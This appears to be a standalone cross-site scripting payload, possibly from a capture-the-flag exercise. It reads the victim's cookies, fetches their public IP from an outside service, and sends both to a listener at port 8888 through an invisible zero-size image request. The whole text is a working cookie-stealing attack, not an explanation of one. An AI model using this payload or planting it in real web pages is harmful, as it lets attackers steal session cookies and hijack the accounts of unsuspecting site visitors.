<script>
var cookie= listCookies();
function listCookies() { 
	var theCookies = document.cookie.split(\';\'); 
	var aString = \'\'; 
	
	for (var i = 0 ; i < theCookies.length; i++) { 
	      aString += theCookies[i];
	}
	
	return aString; 
}
function getIP(json) {
	var result="\ip=\"+json.ip+\" \"+cookie;
	document.write(\'Step 3 is very hard step!<img src="http://127.0.0.1:8888/xss?c=\'+ escape(result) + \'" width=0 height=0 >\');
}
</script>
<script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>